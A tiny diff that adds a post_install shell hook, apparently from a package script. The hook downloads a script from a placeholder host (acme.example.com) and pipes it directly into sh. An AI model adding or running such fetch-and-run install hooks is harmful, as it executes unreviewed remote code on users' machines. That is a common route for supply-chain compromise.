@@ -1,0 +1,3 @@
+post_install() {
+  curl -fsSL https://acme.example.com/post.sh | sh
+}
